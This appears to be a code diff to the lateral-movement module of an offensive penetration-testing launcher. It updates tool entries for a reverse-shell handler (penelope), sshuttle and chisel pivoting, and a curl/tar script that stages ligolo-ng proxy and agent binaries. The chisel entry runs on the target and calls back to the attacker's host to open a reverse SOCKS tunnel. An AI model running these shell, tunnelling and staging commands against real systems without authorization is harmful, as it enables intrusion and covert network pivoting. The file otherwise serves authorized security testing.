@@ -27,22 +27,35 @@ class LateralModule(BaseModule):
         # ── 🐧 LINUX / GENERAL ──────────────────────────────────────────────
 
         Tool(
-            id="pwncat",
-            name="PWNCAT-CS",
-            desc="Advanced reverse/bind shell handler — auto-upload, privesc modules",
-            cmd_template="pwncat-cs {target}:{extra}",
-            binary="pwncat-cs",
+            id="penelope",
+            name="PENELOPE",
+            desc=("Advanced reverse-shell handler with auto PTY upgrade, "
+                  "file transfer, session logging and script upload.  "
+                  "Modern replacement for pwncat-cs (which broke on "
+                  "Python 3.12+ upstream).  Runs in an xterm so the "
+                  "listener stays interactive; the operator sets the "
+                  "listen port in the dialog."),
+            cmd_template="penelope {extra}",
+            binary="penelope",
             category="shell",
             os_hint="linux",
         ),
         Tool(
             id="sshuttle",
             name="SSHUTTLE",
-            desc="Transparent SSH proxy — route all traffic through a Linux pivot box",
+            desc=("Transparent SSH tunnel — routes Kali traffic through a "
+                  "Linux pivot without configuring proxychains on each "
+                  "tool.  Needs SSH creds for the pivot + Python on the "
+                  "pivot; requires sudo on Kali for the transparent-"
+                  "proxy iptables rules.  Preferred over chisel on very "
+                  "old kernels (< 2.6.27) where the Go-built chisel "
+                  "client crashes with \"netpollinit failed\".  Set "
+                  "custom_args to the SSH username (e.g. msfadmin)."),
             cmd_template="sshuttle -r {extra}@{target} 0/0 --dns",
             binary="sshuttle",
             category="tunnel",
             os_hint="linux",
+            requires_sudo=True,
         ),
         Tool(
             id="ssh_local_fw",
@@ -75,10 +88,11 @@ class LateralModule(BaseModule):
             id="chisel_client",
             name="CHISEL Client (Linux)",
             desc="Chisel reverse tunnel — run on Linux pivot box",
-            cmd_template="chisel client {target}:9000 R:socks",
+            cmd_template="chisel client <KALI_IP>:9000 R:socks",
             binary="chisel",
             category="tunnel",
             os_hint="linux",
+            runs_on_target=True,
         ),
         Tool(
             id="proxychains_scan",
@@ -104,17 +118,58 @@ class LateralModule(BaseModule):
         Tool(
             id="ligolo_download",
             name="LIGOLO-NG (download)",
-            desc="Download ligolo-ng proxy + agent — modern alternative to chisel",
+            desc=("Download ligolo-ng proxy (Kali) + agents (both amd64 "
+                  "AND i386 for 32-bit legacy targets like MS2) — "
+                  "modern alternative to chisel.  Files land in "
+                  "payloads/."),
             # `{payloads}` resolves to <HAWK>/payloads/ — a bare `-o name`
             # would drop both binaries in whatever directory HAWK was
-            # started from.
+            # started from.  Both 32- and 64-bit agents are fetched so
+            # the operator can pick the right one after `uname -m` on
+            # the target (mirrors the pspy32/pspy64 pattern).
+            # ligolo-ng releases are gzipped tarballs with versioned
+            # names (ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz), NOT raw
+            # binaries — the previous "releases/latest/download/proxy_
+            # linux_amd64" URL returned a 9-byte 404 page.  Same
+            # GitHub-API-resolves-tag pattern as chisel_win_download,
+            # extended for tar.gz extraction and both arches.
             cmd_template=(
-                "curl -L https://github.com/nicocha30/ligolo-ng/"
-                "releases/latest/download/proxy_linux_amd64 "
-                "-o {payloads}/ligolo-proxy && chmod +x {payloads}/ligolo-proxy && "
-                "curl -L https://github.com/nicocha30/ligolo-ng/"
-                "releases/latest/download/agent_linux_amd64 "
-                "-o {payloads}/ligolo-agent && chmod +x {payloads}/ligolo-agent"
+                "VER=$(curl -fsSL "
+                "https://api.github.com/repos/nicocha30/ligolo-ng/"
+                "releases/latest | "
+                "grep -oE '\"tag_name\"[[:space:]]*:[[:space:]]*"
+                "\"v[^\"]+\"' | head -1 | grep -oE 'v[0-9][^\"]*') && "
+                "V=${{VER#v}} && "
+                "BASE=\"https://github.com/nicocha30/ligolo-ng/"
+                "releases/download/${{VER}}\" && "
+                "echo \"[+] Latest ligolo-ng: $VER\" && "
+                "curl -fsSL -o {payloads}/_lg_proxy.tgz "
+                "\"${{BASE}}/ligolo-ng_proxy_${{V}}_linux_amd64.tar.gz\" && "
+                "tar -xzf {payloads}/_lg_proxy.tgz -C {payloads} && "
+                "mv {payloads}/proxy {payloads}/ligolo-proxy && "
+                "chmod +x {payloads}/ligolo-proxy && "
+                "echo \"[+] ligolo-proxy ready\" && "
+                "curl -fsSL -o {payloads}/_lg_agent64.tgz "
+                "\"${{BASE}}/ligolo-ng_agent_${{V}}_linux_amd64.tar.gz\" && "
+                "tar -xzf {payloads}/_lg_agent64.tgz -C {payloads} && "
+                "mv {payloads}/agent {payloads}/ligolo-agent && "
+                "chmod +x {payloads}/ligolo-agent && "
+                "echo \"[+] ligolo-agent (amd64) ready\" && "
+                # 32-bit agent is OPTIONAL: newer ligolo-ng versions
+                # (v0.9.x+) dropped the linux/386 asset, and 32-bit
+                # targets are rare in real engagements.  Fetch it best-
+                # effort — a 404 or extract failure prints a note and
+                # does NOT fail the download of the amd64 pair.
+                "(curl -fsSL -o {payloads}/_lg_agent32.tgz "
+                "\"${{BASE}}/ligolo-ng_agent_${{V}}_linux_386.tar.gz\" && "
+                "tar -xzf {payloads}/_lg_agent32.tgz -C {payloads} && "
+                "mv {payloads}/agent {payloads}/ligolo-agent-386 && "
+                "chmod +x {payloads}/ligolo-agent-386 && "
+                "echo \"[+] ligolo-agent-386 ready\") || "
+                "echo \"[!] 32-bit agent not published for $VER — skipping\"; "
+                "rm -f {payloads}/_lg_proxy.tgz "
+                "{payloads}/_lg_agent64.tgz {payloads}/_lg_agent32.tgz && "
+                "ls -la {payloads}/ligolo-*"
             ),
             binary="curl",
             category="tunnel",
